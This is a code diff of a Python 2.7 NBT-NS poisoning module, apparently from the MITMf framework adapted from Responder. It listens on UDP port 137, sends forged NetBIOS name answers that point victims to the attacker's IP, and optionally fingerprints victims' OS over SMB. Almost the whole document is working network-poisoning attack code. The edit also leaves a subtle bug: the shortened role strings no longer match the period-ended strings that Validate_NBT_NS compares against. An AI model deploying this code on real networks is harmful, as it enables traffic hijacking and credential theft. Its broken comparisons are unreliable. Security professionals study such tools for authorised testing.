@@ -1,18 +1,34 @@
 #! /usr/bin/env python2.7
 
-from SocketServer import UDPServer, ThreadingMixIn, BaseRequestHandler
 import threading
+import socket
 import struct
+import logging
 
+from SocketServer import UDPServer, ThreadingMixIn, BaseRequestHandler
+from core.configwatcher import ConfigWatcher
+from core.responder.fingerprinter.Fingerprint import RunSmbFinger
+from core.responder.odict import OrderedDict
 from core.responder.packet import Packet
+from core.responder.common import *
+
+mitmf_logger = logging.getLogger("mitmf")
 
 class NBTNSPoisoner():
 
-	def start():
-		server = ThreadingUDPServer(("0.0.0.0", 137), NB)
-		t = threading.Thread(name="NBNS", target=server.serve_forever()) #NBNS
-		t.setDaemon(True)
-		t.start()
+	def start(self, options, ourip):
+
+		global OURIP; OURIP = ourip
+		global args; args = options
+
+		try:
+			mitmf_logger.debug("[NBTNSPoisoner] OURIP => {}".format(ourip))
+			server = ThreadingUDPServer(("0.0.0.0", 137), NB)
+			t = threading.Thread(name="NBTNSPoisoner", target=server.serve_forever)
+			t.setDaemon(True)
+			t.start()
+		except Exception, e:
+			mitmf_logger.debug("[NBTNSPoisoner] Error starting on port 137: {}".format(e))
 
 class ThreadingUDPServer(ThreadingMixIn, UDPServer):
 
@@ -42,17 +58,17 @@ class NBT_Ans(Packet):
 	def calculate(self,data):
 		self.fields["Tid"] = data[0:2]
 		self.fields["NbtName"] = data[12:46]
-		self.fields["IP"] = inet_aton(OURIP)
+		self.fields["IP"] = socket.inet_aton(OURIP)
 
 def NBT_NS_Role(data):
 	Role = {
-		"\x41\x41\x00":"Workstation/Redirector Service.",
-		"\x42\x4c\x00":"Domain Master Browser. This name is likely a domain controller or a homegroup.)",
-		"\x42\x4d\x00":"Domain controller service. This name is a domain controller.",
-		"\x42\x4e\x00":"Local Master Browser.",
-		"\x42\x4f\x00":"Browser Election Service.",
-		"\x43\x41\x00":"File Server Service.",
-		"\x41\x42\x00":"Browser Service.",
+		"\x41\x41\x00":"Workstation/Redirector Service",
+		"\x42\x4c\x00":"Domain Master Browser",
+		"\x42\x4d\x00":"Domain controller service",
+		"\x42\x4e\x00":"Local Master Browser",
+		"\x42\x4f\x00":"Browser Election Service",
+		"\x43\x41\x00":"File Server Service",
+		"\x41\x42\x00":"Browser Service",
 	}
 
 	if data in Role:
@@ -62,13 +78,13 @@ def NBT_NS_Role(data):
 
 # Define what are we answering to.
 def Validate_NBT_NS(data,Wredirect):
-	if AnalyzeMode:
+	if args.analyze:
 		return False
 
 	if NBT_NS_Role(data[43:46]) == "File Server Service.":
 		return True
 
-	if NBTNSDomain == True:
+	if args.nbtns == True:
 		if NBT_NS_Role(data[43:46]) == "Domain controller service. This name is a domain controller.":
 			return True
 
@@ -96,6 +112,13 @@ def Decode_Name(nbname):
 class NB(BaseRequestHandler):
 
 	def handle(self):
+
+		ResponderConfig   = ConfigWatcher.getInstance().getConfig()['Responder']
+		DontRespondTo     = ResponderConfig['DontRespondTo']
+		DontRespondToName = ResponderConfig['DontRespondToName']
+		RespondTo         = ResponderConfig['RespondTo']
+		RespondToName     = ResponderConfig['RespondToName']
+
 		data, socket = self.request
 		Name = Decode_Name(data[13:45])
 
@@ -106,59 +129,46 @@ class NB(BaseRequestHandler):
 		if DontRespondToSpecificName(DontRespondToName) and DontRespondToNameScope(DontRespondToName.upper(), Name.upper()):
 			return None 
 
-		if AnalyzeMode:
+		if args.analyze:
 			if data[2:4] == "\x01\x10":
-				if Is_Finger_On(Finger_On_Off):
+				if args.finger:
 					try:
 						Finger = RunSmbFinger((self.client_address[0],445))
-						Message = "[Analyze mode: NBT-NS] Host: %s is looking for : %s. Service requested is: %s.\nOs Version is: %s Client Version is: %s"%(self.client_address[0], Name,NBT_NS_Role(data[43:46]),Finger[0],Finger[1])
-						logger3.warning(Message)
+						mitmf_logger.warning("[NBTNSPoisoner] {} is looking for: {} | Service requested: {} | OS: {} | Client Version: {}".format(self.client_address[0], Name,NBT_NS_Role(data[43:46]),Finger[0],Finger[1]))
 					except Exception:
-						Message = "[Analyze mode: NBT-NS] Host: %s is looking for : %s. Service requested is: %s\n"%(self.client_address[0], Name,NBT_NS_Role(data[43:46]))
-						logger3.warning(Message)
+						mitmf_logger.warning("[NBTNSPoisoner] {} is looking for: {} | Service requested is: {}".format(self.client_address[0], Name, NBT_NS_Role(data[43:46])))
 				else:
-					Message = "[Analyze mode: NBT-NS] Host: %s is looking for : %s. Service requested is: %s"%(self.client_address[0], Name,NBT_NS_Role(data[43:46]))
-					logger3.warning(Message)
+					mitmf_logger.warning("[NBTNSPoisoner] {} is looking for: {} | Service requested is: {}".format(self.client_address[0], Name, NBT_NS_Role(data[43:46])))
 
-		if RespondToSpecificHost(RespondTo) and AnalyzeMode == False:
+		if RespondToSpecificHost(RespondTo) and args.analyze == False:
 			if RespondToIPScope(RespondTo, self.client_address[0]):
 				if data[2:4] == "\x01\x10":
-					if Validate_NBT_NS(data,Wredirect):
+					if Validate_NBT_NS(data,args.wredir):
 						if RespondToSpecificName(RespondToName) == False:
 							buff = NBT_Ans()
 							buff.calculate(data)
 							for x in range(1):
 								socket.sendto(str(buff), self.client_address)
-								Message = 'NBT-NS Answer sent to: %s. The requested name was : %s'%(self.client_address[0], Name)
-								#responder_logger.info(Message)
-								logger2.warning(Message)
-								if Is_Finger_On(Finger_On_Off):
+								mitmf_logger.warning('[NBTNSPoisoner] Poisoned answer sent to {} the requested name was: {}'.format(self.client_address[0], Name))
+								if args.finger:
 									try:
 										Finger = RunSmbFinger((self.client_address[0],445))
-										#print '[+] OsVersion is:%s'%(Finger[0])
-										#print '[+] ClientVersion is :%s'%(Finger[1])
-										responder_logger.info('[+] OsVersion is:%s'%(Finger[0]))
-										responder_logger.info('[+] ClientVersion is :%s'%(Finger[1]))
+										mitmf_logger.info("[NBTNSPoisoner] OS: {} | ClientVersion: {}".format(Finger[0],Finger[1]))
 									except Exception:
-										responder_logger.info('[+] Fingerprint failed for host: %s'%(self.client_address[0]))
+										mitmf_logger.info('[NBTNSPoisoner] Fingerprint failed for host: %s'%(self.client_address[0]))
 										pass
 						if RespondToSpecificName(RespondToName) and RespondToNameScope(RespondToName.upper(), Name.upper()):
 							buff = NBT_Ans()
 							buff.calculate(data)
 							for x in range(1):
 								socket.sendto(str(buff), self.client_address)
-								Message = 'NBT-NS Answer sent to: %s. The requested name was : %s'%(self.client_address[0], Name)
-								#responder_logger.info(Message)
-								logger2.warning(Message)
-								if Is_Finger_On(Finger_On_Off):
+								mitmf_logger.warning('[NBTNSPoisoner] Poisoned answer sent to {} the requested name was: {}'.format(self.client_address[0], Name))
+								if args.finger:
 									try:
 										Finger = RunSmbFinger((self.client_address[0],445))
-										#print '[+] OsVersion is:%s'%(Finger[0])
-										#print '[+] ClientVersion is :%s'%(Finger[1])
-										responder_logger.info('[+] OsVersion is:%s'%(Finger[0]))
-										responder_logger.info('[+] ClientVersion is :%s'%(Finger[1]))
+										mitmf_logger.info("[NBTNSPoisoner] OS: {} | ClientVersion: {}".format(Finger[0],Finger[1]))
 									except Exception:
-										responder_logger.info('[+] Fingerprint failed for host: %s'%(self.client_address[0]))
+										mitmf_logger.info('[NBTNSPoisoner] Fingerprint failed for host: %s'%(self.client_address[0]))
 										pass
 						else:
 							pass
@@ -167,42 +177,32 @@ class NB(BaseRequestHandler):
 
 		else:
 			if data[2:4] == "\x01\x10":
-				if Validate_NBT_NS(data,Wredirect) and AnalyzeMode == False:
+				if Validate_NBT_NS(data,args.wredir) and args.analyze == False:
 					if RespondToSpecificName(RespondToName) and RespondToNameScope(RespondToName.upper(), Name.upper()):
 						buff = NBT_Ans()
 						buff.calculate(data)
 						for x in range(1):
 							socket.sendto(str(buff), self.client_address)
-						Message = 'NBT-NS Answer sent to: %s. The requested name was : %s'%(self.client_address[0], Name)
-						#responder_logger.info(Message)
-						logger2.warning(Message)
-						if Is_Finger_On(Finger_On_Off):
+						mitmf_logger.warning('[NBTNSPoisoner] Poisoned answer sent to {} the requested name was: {}'.format(self.client_address[0], Name))
+						if args.finger:
 							try:
 								Finger = RunSmbFinger((self.client_address[0],445))
-								#print '[+] OsVersion is:%s'%(Finger[0])
-								#print '[+] ClientVersion is :%s'%(Finger[1])
-								responder_logger.info('[+] OsVersion is:%s'%(Finger[0]))
-								responder_logger.info('[+] ClientVersion is :%s'%(Finger[1]))
+								mitmf_logger.info("[NBTNSPoisoner] OS: {} | ClientVersion: {}".format(Finger[0],Finger[1]))
 							except Exception:
-								responder_logger.info('[+] Fingerprint failed for host: %s'%(self.client_address[0]))
+								mitmf_logger.info('[NBTNSPoisoner] Fingerprint failed for host: %s'%(self.client_address[0]))
 								pass
 					if RespondToSpecificName(RespondToName) == False:
 						buff = NBT_Ans()
 						buff.calculate(data)
 						for x in range(1):
 							socket.sendto(str(buff), self.client_address)
-						Message = 'NBT-NS Answer sent to: %s. The requested name was : %s'%(self.client_address[0], Name)
-						#responder_logger.info(Message)
-						logger2.warning(Message)
-						if Is_Finger_On(Finger_On_Off):
+						mitmf_logger.warning('[NBTNSPoisoner] Poisoned answer sent to {} the requested name was: {}'.format(self.client_address[0], Name))
+						if args.finger:
 							try:
 								Finger = RunSmbFinger((self.client_address[0],445))
-								#print '[+] OsVersion is:%s'%(Finger[0])
-								#print '[+] ClientVersion is :%s'%(Finger[1])
-								responder_logger.info('[+] OsVersion is:%s'%(Finger[0]))
-								responder_logger.info('[+] ClientVersion is :%s'%(Finger[1]))
+								mitmf_logger.info("[NBTNSPoisoner] OS: {} | ClientVersion: {}".format(Finger[0],Finger[1]))
 							except Exception:
-								responder_logger.info('[+] Fingerprint failed for host: %s'%(self.client_address[0]))
+								mitmf_logger.info('[NBTNSPoisoner] Fingerprint failed for host: %s'%(self.client_address[0]))
 								pass
 					else:
 						pass
